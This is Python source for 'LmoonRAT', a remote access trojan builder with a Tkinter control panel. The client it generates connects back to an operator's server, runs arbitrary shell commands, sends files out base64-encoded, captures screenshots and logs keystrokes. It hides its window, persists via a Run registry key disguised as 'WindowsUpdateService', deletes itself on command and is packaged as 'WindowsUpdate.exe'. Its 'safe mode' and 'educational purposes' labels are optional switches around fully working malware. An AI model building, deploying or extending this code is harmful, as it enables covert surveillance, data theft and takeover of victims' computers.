import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext, Menu, simpledialog
import os
import sys
import shutil
import subprocess
import json
import threading
import socket
import time
import platform
import winreg
import ctypes
import random
import psutil
from datetime import datetime
import base64
import tempfile

# ========== КОНФИГ БИЛДЕРА ==========
BUILD_DIR = "C:\\LmoonRAT_Builds"
if not os.path.exists(BUILD_DIR):
    os.makedirs(BUILD_DIR)

# ========== ШАБЛОН КЛИЕНТА ==========
CLIENT_TEMPLATE = r'''
import sys
import os
import socket
import threading
import ctypes
import winreg
import subprocess
import platform
import json
from datetime import datetime
import base64
import tempfile
import time

# === КОНФИГУРАЦИЯ КЛИЕНТА ===
SAFE_MODE = {SAFE_MODE}      # Режим безопасного тестирования
DEBUG_MODE = {DEBUG_MODE}    # Режим отладки
PERSISTENT = {PERSISTENT}    # Постоянная установка

def set_autostart():
    """Добавление в автозагрузку"""
    if not PERSISTENT:
        if DEBUG_MODE:
            print("[DEBUG] Автозагрузка отключена по настройкам")
        return
        
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable)
        if DEBUG_MODE:
            print(f"[DEBUG] Добавлено в автозагрузку: {sys.executable}")
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] Ошибка автозагрузки: {str(e)}")

def hide_window():
    """Скрытие окна консоли"""
    if SAFE_MODE or DEBUG_MODE:
        print("[DEBUG] Режим скрытия окна отключен")
        return
        
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    hWnd = kernel32.GetConsoleWindow()
    if hWnd: 
        user32.ShowWindow(hWnd, 0)
        if DEBUG_MODE:
            print("[DEBUG] Окно скрыто")

def get_hwid():
    """Генерация уникального ID устройства"""
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
        return hwid if hwid else platform.node() + str(os.getpid())
    except:
        return platform.node() + str(os.getpid())

def safe_exit():
    """Безопасное самоудаление клиента"""
    try:
        # Удаление из автозагрузки
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.DeleteValue(key, "WindowsUpdateService")
        except:
            pass
        
        # Скрипт самоудаления
        bat_script = f"""
        @echo off
        timeout /t 3 /nobreak >nul
        del /f /q "{os.path.basename(sys.executable)}"
        del /f /q "%~f0"
        """
        
        # Сохраняем BAT-скрипт
        with open("uninstall.bat", "w") as f:
            f.write(bat_script)
            
        # Запускаем самоудаление
        subprocess.Popen("uninstall.bat", creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
        
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] Ошибка самоудаления: {str(e)}")

class LmoonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = None
        self.hwid = get_hwid()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.join_date = datetime.now().strftime("%Y-%m-%d %H:%M")
        self.functions = {{
            "cmd": self.execute_command,
            "download": self.download_file,
            "screenshot": self.capture_screen,
            "keylog": self.start_keylogger,
            "info": self.send_system_info,
            "uninstall": self.uninstall_client
        }}
        
        # Информация для безопасного режима
        if SAFE_MODE:
            print("="*60)
            print("ВНИМАНИЕ: Вы запустили RAT-клиент в безопасном режиме!")
            print("Этот клиент НЕ будет:")
            print("  - Скрывать свое окно")
            print("  - Добавляться в автозагрузку")
            print("  - Выполнять скрытые действия")
            print("Для остановки просто закройте это окно.")
            print("="*60)
        
    def connect(self):
        while True:
            try:
                if SAFE_MODE:
                    print(f"[SAFE] Попытка подключения к {self.host}:{self.port}")
                    
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.host, self.port))
                
                if SAFE_MODE:
                    print("[SAFE] Успешное подключение к серверу")
                
                # Отправляем информацию о себе
                self.send_system_info()
                self.handle_connection()
            except Exception as e: 
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка подключения: {str(e)}")
                time.sleep(30)
                
    def handle_connection(self):
        while True:
            try:
                data = self.connection.recv(4096).decode()
                if not data: 
                    if SAFE_MODE:
                        print("[SAFE] Соединение разорвано")
                    break
                
                if SAFE_MODE:
                    print(f"[SAFE] Получена команда: {data[:50]}...")
                
                cmd = data.split()[0]
                if cmd in self.functions:
                    self.functions[cmd](data)
            except Exception as e:
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка обработки: {str(e)}")
                break
    
    def send_system_info(self, _=None):
        info = {
            "hwid": self.hwid,
            "os": self.os_info,
            "join_date": self.join_date,
            "status": "online",
            "ip": socket.gethostbyname(socket.gethostname()),
            "safe_mode": SAFE_MODE
        }
        self.connection.send(json.dumps(info).encode())
    
    # Основные функции
    def execute_command(self, data):
        cmd = ' '.join(data.split()[1:])
        
        if SAFE_MODE:
            print(f"[SAFE] Выполнение команды: {cmd}")
        
        result = subprocess.getoutput(cmd)
        self.connection.send(result.encode())
        
    def download_file(self, data):
        filepath = data.split()[1]
        if SAFE_MODE:
            print(f"[SAFE] Запрос файла: {filepath}")
            
        if os.path.exists(filepath):
            with open(filepath, 'rb') as f:
                self.connection.send(base64.b64encode(f.read()))
    
    def capture_screen(self, _):
        try:
            if SAFE_MODE:
                print("[SAFE] Запрос скриншота экрана")
                
            from mss import mss
            with mss() as sct:
                filename = sct.shot(mon=-1, output='monitor.png')
                with open(filename, 'rb') as f:
                    self.connection.send(f.read())
            os.remove(filename)
        except:
            self.connection.send(b"Screenshot module not installed")
    
    def start_keylogger(self, _):
        try:
            if SAFE_MODE:
                print("[SAFE] Запуск кейлоггера (демо-режим)")
                self.connection.send(b"Keylogger simulation in safe mode")
                return
                
            from pynput import keyboard
            log = []
            
            def on_press(key):
                try: log.append(str(key.char))
                except: 
                    if key == keyboard.Key.space: log.append(' ')
                    elif key == keyboard.Key.enter: log.append('\\n')
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            time.sleep(30)
            listener.stop()
            self.connection.send(''.join(log).encode())
        except:
            self.connection.send(b"Keylogger module not installed")
    
    def uninstall_client(self, _):
        """Самоудаление клиента по команде сервера"""
        if SAFE_MODE:
            print("[SAFE] Получена команда на самоудаление")
            
        self.connection.send(b"Uninstalling client...")
        safe_exit()

# Точка входа
if __name__ == "__main__":
    # Проверка безопасного режима
    if {SAFE_MODE}:
        print("Запуск в безопасном режиме активирован")
    
    hide_window()
    set_autostart()
    client = LmoonClient("{HOST}", {PORT})
    threading.Thread(target=client.connect, daemon=True).start()
    
    # Бесконечный цикл с контролем нагрузки
    while True:
        time.sleep(1)
        # В безопасном режиме снижаем нагрузку
        if {SAFE_MODE}:
            time.sleep(10)
'''

# ========== GUI КОНТРОЛЛЕРА ==========
class RatController:
    def __init__(self, root):
        self.root = root
        root.title("LmoonRAT Safe Builder")
        root.geometry("1200x700")
        self.setup_ui()
        self.clients = {}
        self.server_thread = None
        self.server_running = False
        self.start_server()

    def setup_ui(self):
        # Синий фон для безопасного режима
        self.root.configure(bg="#1e3f5a")
        
        # Верхняя панель с тремя полосками
        top_frame = tk.Frame(self.root, bg="#0d2b40", height=40)
        top_frame.pack(fill=tk.X)
        
        # Кнопка меню (три полоски)
        self.menu_btn = tk.Button(top_frame, text="☰", bg="#0d2b40", fg="white", bd=0, 
                                 font=("Arial", 14), command=self.show_main_menu)
        self.menu_btn.pack(side=tk.LEFT, padx=10)
        
        # Заголовок
        tk.Label(top_frame, text="LmoonRAT Safe Builder 5.0", bg="#0d2b40", fg="white", 
                font=("Arial", 14, "bold")).pack(side=tk.LEFT, padx=10)
        
        # Статистика
        stats_frame = tk.Frame(top_frame, bg="#0d2b40")
        stats_frame.pack(side=tk.RIGHT, padx=20)
        
        tk.Label(stats_frame, text="Port [7777]", bg="#0d2b40", fg="white").grid(row=0, column=0, padx=5)
        tk.Label(stats_frame, text="Key [SAFE]", bg="#0d2b40", fg="white").grid(row=0, column=1, padx=5)
        tk.Label(stats_frame, text="Sent [00]", bg="#0d2b40", fg="white").grid(row=0, column=2, padx=5)
        tk.Label(stats_frame, text="Received [00]", bg="#0d2b40", fg="white").grid(row=0, column=3, padx=5)
        tk.Label(stats_frame, text="Mode [SAFE]", bg="#0d2b40", fg="#4CAF50").grid(row=0, column=4, padx=5)
        
        # Создаем меню сразу
        self.create_menus()
        
        # Вкладки
        self.tab_control = ttk.Notebook(self.root)
        
        # Вкладка: Пользователи
        self.tab_users = ttk.Frame(self.tab_control)
        self.setup_users_tab()
        
        # Вкладка: Билдер
        self.tab_builder = ttk.Frame(self.tab_control)
        self.setup_builder_tab()
        
        # Вкладка: Консоль
        self.tab_console = ttk.Frame(self.tab_control)
        self.setup_console_tab()
        
        self.tab_control.add(self.tab_users, text='👥 Users')
        self.tab_control.add(self.tab_builder, text='🛠️ Builder')
        self.tab_control.add(self.tab_console, text='💻 Console')
        self.tab_control.pack(expand=1, fill="both", padx=10, pady=10)
        
        # Статус бар
        self.status = tk.Label(self.root, text="Items [0]   Selected [0]   Mode [SAFE]", 
                             bg="#0a1e2d", fg="white", anchor=tk.W)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)
    
    def create_menus(self):
        # Главное меню
        self.main_menu = Menu(self.root, tearoff=0, bg="#1e3f5a", fg="white", font=("Arial", 10))
        
        # Секция управления
        control_menu = Menu(self.main_menu, tearoff=0, bg="#2a4b6a", fg="white")
        control_menu.add_command(label="Start Server", command=self.start_server)
        control_menu.add_command(label="Stop Server", command=self.stop_server)
        control_menu.add_separator()
        control_menu.add_command(label="Exit", command=self.root.destroy)
        self.main_menu.add_cascade(label="Control", menu=control_menu)
        
        # Секция клиентов
        clients_menu = Menu(self.main_menu, tearoff=0, bg="#2a4b6a", fg="white")
        clients_menu.add_command(label="Refresh Clients", command=self.refresh_clients)
        clients_menu.add_command(label="Select All", command=self.select_all_clients)
        clients_menu.add_command(label="Clear Selection", command=self.clear_selection)
        self.main_menu.add_cascade(label="Clients", menu=clients_menu)
        
        # Секция сборки
        build_menu = Menu(self.main_menu, tearoff=0, bg="#2a4b6a", fg="white")
        build_menu.add_command(label="Build Client", command=self.build_client)
        build_menu.add_command(label="Open Build Folder", command=self.open_build_dir)
        self.main_menu.add_cascade(label="Builder", menu=build_menu)
        
        # Секция помощи
        help_menu = Menu(self.main_menu, tearoff=0, bg="#2a4b6a", fg="white")
        help_menu.add_command(label="Safe Mode Guide", command=self.show_safe_guide)
        help_menu.add_command(label="About", command=self.show_about)
        self.main_menu.add_cascade(label="Help", menu=help_menu)
        
        # Контекстное меню для пользователей
        self.context_menu = Menu(self.root, tearoff=0, bg="#1e3f5a", fg="white")
        self.context_menu.add_command(label="Execute Command", command=self.execute_selected)
        self.context_menu.add_command(label="Take Screenshot", command=self.screenshot_selected)
        self.context_menu.add_command(label="Uninstall Client", command=self.uninstall_selected)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Disconnect", command=self.disconnect_selected)
    
    def show_safe_guide(self):
        messagebox.showinfo("Safe Mode Guide",
            "Безопасный режим (Safe Mode):\n"
            "• Не добавляет в автозагрузку\n"
            "• Не скрывает окно клиента\n"
            "• Выводит все действия в консоль\n"
            "• Снижает нагрузку на систему\n"
            "• Легко удаляется через крестик\n\n"
            "Используйте для тестирования на основном ПК!")
    
    def show_about(self):
        messagebox.showinfo("About LmoonRAT Safe Builder",
            "Версия: 5.0 (Safe Edition)\n"
            "Разработано для образовательных целей\n\n"
            "Особенности:\n"
            "- Полностью безопасное тестирование\n"
            "- Встроенные механизмы самоудаления\n"
            "- Контроль нагрузки на систему\n"
            "- Подробное логирование действий\n\n"
            "ВНИМАНИЕ: Используйте только законно!")
    
    def show_main_menu(self, event=None):
        self.main_menu.post(self.menu_btn.winfo_rootx(), 
                           self.menu_btn.winfo_rooty() + self.menu_btn.winfo_height())
    
    def show_context_menu(self, event):
        # Определяем, на какой строке был клик
        row_id = self.tree.identify_row(event.y)
        if not row_id:
            return
            
        # Выбираем строку
        self.tree.selection_set(row_id)
        self.context_menu.post(event.x_root, event.y_root)
    
    def setup_users_tab(self):
        frame = ttk.Frame(self.tab_users)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Таблица пользователей
        columns = ("IP", "Country", "ID", "Safe Mode", "OS", "Group", "Date")
        self.tree = ttk.Treeview(frame, columns=columns, show="headings", height=20)
        
        # Настройка колонок
        col_widths = [120, 80, 150, 80, 150, 80, 120]
        for col, width in zip(columns, col_widths):
            self.tree.heading(col, text=col)
            self.tree.column(col, width=width, anchor=tk.CENTER)
        
        # Привязка правой кнопки мыши
        self.tree.bind("<Button-3>", self.show_context_menu)
        
        # Скроллбар
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        # Кнопки управления
        btn_frame = tk.Frame(frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(btn_frame, text="Refresh", command=self.refresh_clients, 
                 bg="#4CAF50", fg="white").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Uninstall All", command=self.uninstall_all, 
                 bg="#f44336", fg="white").pack(side=tk.RIGHT, padx=5)
    
    def setup_builder_tab(self):
        frame = ttk.Frame(self.tab_builder)
        frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Настройки билдера
        settings_frame = ttk.LabelFrame(frame, text="Build Settings")
        settings_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(settings_frame, text="Server IP:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.ip_entry = tk.Entry(settings_frame, width=25)
        self.ip_entry.insert(0, "127.0.0.1")  # Базовый IP для тестов
        self.ip_entry.grid(row=0, column=1, padx=5, pady=2)
        
        tk.Label(settings_frame, text="Port:").grid(row=0, column=2, sticky="w", padx=5, pady=2)
        self.port_entry = tk.Entry(settings_frame, width=10)
        self.port_entry.insert(0, "7777")
        self.port_entry.grid(row=0, column=3, padx=5, pady=2)
        
        # Опция для внешнего доступа через playit.gg
        tk.Label(settings_frame, text="External Access:").grid(row=0, column=4, sticky="w", padx=5, pady=2)
        self.external_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(settings_frame, text="Use playit.gg", variable=self.external_var).grid(row=0, column=5, padx=5)
        
        tk.Label(settings_frame, text="Filename:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
        self.filename_entry = tk.Entry(settings_frame, width=25)
        self.filename_entry.insert(0, "WindowsUpdate.exe")
        self.filename_entry.grid(row=1, column=1, padx=5, pady=2)
        
        tk.Label(settings_frame, text="Icon:").grid(row=1, column=2, sticky="w", padx=5, pady=2)
        self.icon_path = tk.StringVar()
        tk.Entry(settings_frame, textvariable=self.icon_path, width=20).grid(row=1, column=3, padx=5, pady=2, sticky="w")
        tk.Button(settings_frame, text="Browse", command=self.select_icon, width=8).grid(row=1, column=4, padx=5)
        
        # Опции безопасности
        options_frame = ttk.LabelFrame(settings_frame, text="Security Options")
        options_frame.grid(row=2, column=0, columnspan=6, sticky="we", padx=5, pady=10)
        
        # Опция 1: Безопасный режим
        self.safe_mode = tk.BooleanVar(value=True)
        tk.Checkbutton(
            options_frame, 
            text="Safe Mode (для теста на основном ПК)", 
            variable=self.safe_mode,
            bg="#1e3f5a", fg="white", selectcolor="#0d2b40"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=2)
        
        # Опция 2: Отладка
        self.debug_mode = tk.BooleanVar(value=True)
        tk.Checkbutton(
            options_frame, 
            text="Debug Mode (показать консоль)", 
            variable=self.debug_mode,
            bg="#1e3f5a", fg="white", selectcolor="#0d2b40"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=2)
        
        # Опция 3: Постоянная установка
        self.persistent_mode = tk.BooleanVar(value=False)
        tk.Checkbutton(
            options_frame, 
            text="Persistent (добавить в автозагрузку)", 
            variable=self.persistent_mode,
            bg="#1e3f5a", fg="white", selectcolor="#0d2b40"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=2)
        
        # Кнопка сборки
        build_frame = tk.Frame(frame)
        build_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(build_frame, text="Build Client", command=self.build_client, 
                 bg="#4CAF50", fg="white", width=15).pack(side=tk.LEFT, padx=5)
        
        tk.Button(build_frame, text="Open Build Folder", command=self.open_build_dir, 
                 bg="#2196F3", fg="white").pack(side=tk.LEFT, padx=5)
        
        # Консоль вывода
        console_frame = ttk.LabelFrame(frame, text="Build Log")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg="#0d2b40", fg="#73daca", height=10)
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.console.insert(tk.END, "Готов к сборке безопасных клиентов...\n")
        self.console.insert(tk.END, "Рекомендуется использовать Safe Mode для тестов на основном ПК!\n\n")
        self.console.insert(tk.END, "Для локальных тестов используйте IP: 127.0.0.1\n")
        self.console.insert(tk.END, "Для внешнего доступа активируйте playit.gg\n")
    
    def setup_console_tab(self):
        frame = ttk.Frame(self.tab_console)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.cmd_output = scrolledtext.ScrolledText(frame, bg="#0d2b40", fg="#73daca", height=20)
        self.cmd_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        input_frame = tk.Frame(frame)
        input_frame.pack(fill=tk.X, pady=5)
        
        self.cmd_entry = tk.Entry(input_frame, width=50)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        tk.Button(input_frame, text="Execute", command=self.execute_command, 
                 bg="#4CAF50", fg="white").pack(side=tk.RIGHT, padx=5)
    
    # ========== СЕРВЕР ==========
    def start_server(self):
        self.server_thread = threading.Thread(target=self.run_server, daemon=True)
        self.server_running = True
        self.server_thread.start()
        self.log("[*] Сервер запущен на 0.0.0.0:7777")
        self.log("[*] Для локальных тестов используйте IP: 127.0.0.1")
        self.log("[*] Для внешнего доступа настройте playit.gg")
    
    def run_server(self):
        HOST = '0.0.0.0'
        PORT = 7777
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            
            while self.server_running:
                try:
                    conn, addr = s.accept()
                    self.log(f"[+] Новое подключение от {addr[0]}:{addr[1]}")
                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                    client_thread.start()
                except:
                    break
    
    def handle_client(self, conn, addr):
        try:
            while True:
                data = conn.recv(4096)
                if not data: break
                
                try:
                    # Пытаемся декодировать JSON
                    client_info = json.loads(data.decode())
                    self.add_client(conn, addr, client_info)
                except:
                    # Если не JSON, выводим как есть
                    self.cmd_output.insert(tk.END, f"{addr[0]}: {data.decode()}\n")
                    self.cmd_output.see(tk.END)
        except Exception as e:
            self.log(f"[!] Ошибка клиента: {str(e)}")
        finally:
            conn.close()
            self.log(f"[-] Подключение закрыто: {addr[0]}")
            self.remove_client(addr[0])
    
    # ========== ФУНКЦИОНАЛ КЛИЕНТОВ ==========
    def add_client(self, conn, addr, client_info):
        client_id = client_info.get("hwid", "N/A")
        self.clients[addr[0]] = {
            "conn": conn,
            "hwid": client_id,
            "os": client_info.get("os", "N/A"),
            "join_date": client_info.get("join_date", "N/A"),
            "ip": addr[0],
            "safe_mode": client_info.get("safe_mode", False)
        }
        
        # Обновляем GUI в основном потоке
        self.root.after(0, self.add_client_to_table, addr[0], client_info)
    
    def add_client_to_table(self, ip, client_info):
        # Определяем страну по IP (демо)
        country = "UA" if random.random() > 0.5 else "RU"
        safe_status = "YES" if client_info.get("safe_mode", False) else "NO"
        
        self.tree.insert("", "end", values=(
            ip,
            country,
            client_info.get("hwid", "N/A"),
            safe_status,
            client_info.get("os", "N/A"),
            "Default",
            client_info.get("join_date", "N/A")
        ))
        
        # Обновляем статус бар
        self.status.config(text=f"Items [{len(self.clients)}]   Selected [0]   Safe Clients: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
    
    def remove_client(self, ip):
        if ip in self.clients:
            del self.clients[ip]
            
            # Удаляем из таблицы
            for child in self.tree.get_children():
                if self.tree.item(child, "values")[0] == ip:
                    self.tree.delete(child)
                    break
            
            self.status.config(text=f"Items [{len(self.clients)}]   Selected [0]   Safe Clients: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
    
    def refresh_clients(self):
        # Проверяем активность клиентов
        for ip, client in list(self.clients.items()):
            try:
                client["conn"].send(b"ping")
            except:
                self.remove_client(ip)
    
    def get_selected_client(self):
        selection = self.tree.selection()
        if not selection:
            return None
            
        selected_item = self.tree.item(selection[0])
        ip = selected_item["values"][0]
        return self.clients.get(ip)
    
    def execute_selected(self):
        client = self.get_selected_client()
        if not client:
            return
            
        cmd = simpledialog.askstring("Execute Command", "Enter command to execute:")
        if cmd:
            try:
                client["conn"].send(f"cmd {cmd}".encode())
                self.log(f"[*] Команда отправлена {client['ip']}: {cmd}")
            except:
                self.log(f"[!] Ошибка отправки команды {client['ip']}")
    
    def screenshot_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"screenshot")
                self.log(f"[*] Запрос скриншота от {client['ip']}")
            except:
                self.log(f"[!] Ошибка запроса скриншота {client['ip']}")
    
    def uninstall_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"uninstall")
                self.log(f"[*] Отправлена команда самоудаления {client['ip']}")
            except:
                self.log(f"[!] Ошибка отправки команды самоудаления {client['ip']}")
    
    def uninstall_all(self):
        for ip, client in list(self.clients.items()):
            try:
                client["conn"].send(b"uninstall")
                self.log(f"[*] Отправлена команда самоудаления {ip}")
            except:
                self.log(f"[!] Ошибка отправки команды самоудаления {ip}")
    
    def disconnect_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].close()
                self.log(f"[*] Отключен клиент {client['ip']}")
                self.remove_client(client['ip'])
            except:
                self.log(f"[!] Ошибка отключения клиента {client['ip']}")
    
    # ========== ФУНКЦИИ МЕНЮ ==========
    def select_all_clients(self):
        self.tree.selection_set(self.tree.get_children())
        self.status.config(text=f"Items [{len(self.clients)}]   Selected [{len(self.tree.selection())}]")
    
    def clear_selection(self):
        self.tree.selection_remove(self.tree.selection())
        self.status.config(text=f"Items [{len(self.clients)}]   Selected [0]")
    
    def stop_server(self):
        self.server_running = False
        # Принудительно закрываем сокет для выхода из accept()
        try:
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.connect(('127.0.0.1', 7777))
            temp_socket.close()
        except:
            pass
        self.log("[*] Сервер остановлен")

    # ========== ФУНКЦИОНАЛ БИЛДЕРА ==========
    def select_icon(self):
        file = filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")])
        if file: self.icon_path.set(file)
    
    def log(self, message):
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
    
    def open_build_dir(self):
        subprocess.Popen(f'explorer "{BUILD_DIR}"')
    
    def build_client(self):
        # Получение параметров
        port = int(self.port_entry.get())
        filename = self.filename_entry.get()
        icon_path = self.icon_path.get()
        
        # Определение хоста в зависимости от настроек
        if self.external_var.get():
            host = "your_tunnel.playit.gg"  # Замените на ваш туннель
            self.log("[*] Используется внешний доступ через playit.gg")
        else:
            host = self.ip_entry.get()
            self.log("[*] Используется локальный IP для тестов")
        
        # Генерация кода клиента
        client_code = self.generate_client_code(host, port)
        
        # Сохранение кода
        py_path = os.path.join(BUILD_DIR, "client_temp.py")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(client_code)
            
        # Команда сборки
        build_cmd = f'pyinstaller --noconsole --onefile --log-level=ERROR --noconfirm --clean'
        if icon_path:
            build_cmd += f' --icon="{icon_path}"'
        build_cmd += f' --distpath="{BUILD_DIR}"'
        build_cmd += f' --name="{filename}"'
        build_cmd += f' "{py_path}"'
        
        # Запуск сборки в отдельном потоке
        threading.Thread(target=self.run_build, args=(build_cmd, py_path, filename)).start()
        self.log("[*] Начало сборки клиента...")
        self.log(f"[>] Команда: {build_cmd}")
    
    def generate_client_code(self, host, port):
        # Подставляем настройки в шаблон
        return CLIENT_TEMPLATE.format(
            HOST=host,
            PORT=port,
            SAFE_MODE=str(self.safe_mode.get()).lower(),
            DEBUG_MODE=str(self.debug_mode.get()).lower(),
            PERSISTENT=str(self.persistent_mode.get()).lower()
        )
    
    def run_build(self, cmd, py_path, filename):
        try:
            # Запуск PyInstaller
            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            stdout, stderr = process.communicate()
            
            if process.returncode == 0:
                self.log("[+] Сборка успешна!")
                self.log(f"[+] Клиент сохранен: {BUILD_DIR}\\{filename}.exe")
                
                # Автозапуск клиента после сборки
                if self.safe_mode.get():
                    exe_path = os.path.join(BUILD_DIR, f"{filename}.exe")
                    if os.path.exists(exe_path):
                        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        self.log("[+] Клиент автоматически запущен")
                
                # Удаление временных файлов
                temp_files = [
                    os.path.join(BUILD_DIR, "client_temp"),
                    os.path.join(BUILD_DIR, "build"),
                    py_path,
                    os.path.join(os.getcwd(), "WindowsUpdate.exe.spec")
                ]
                
                for path in temp_files:
                    if os.path.exists(path):
                        if os.path.isdir(path):
                            shutil.rmtree(path, ignore_errors=True)
                        else:
                            try:
                                os.remove(path)
                            except:
                                pass
                
                # Информация о безопасном режиме
                if self.safe_mode.get():
                    self.log("[!] ВНИМАНИЕ: Клиент собран в безопасном режиме")
                    self.log("    • Не добавляется в автозагрузку")
                    self.log("    • Не скрывает свое окно")
                    self.log("    • Легко удаляется через крестик")
            else:
                self.log("[!] Ошибка сборки!")
                error_lines = [line for line in stderr.split('\n') if 'error' in line.lower()]
                self.log('\n'.join(error_lines[:10]))
                
        except Exception as e:
            self.log(f"[!] Критическая ошибка: {str(e)}")

    def execute_command(self):
        cmd = self.cmd_entry.get()
        if not cmd:
            return
            
        self.cmd_output.insert(tk.END, f">>> {cmd}\n")
        self.cmd_entry.delete(0, tk.END)
        
        # Отправка команды всем клиентам
        for ip, client in self.clients.items():
            try:
                client["conn"].send(f"cmd {cmd}".encode())
                self.cmd_output.insert(tk.END, f"[{ip}] Команда отправлена\n")
            except:
                self.cmd_output.insert(tk.END, f"[{ip}] Ошибка отправки\n")
        
        self.cmd_output.see(tk.END)

# ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
if __name__ == "__main__":
    root = tk.Tk()
    app = RatController(root)
    root.mainloop()
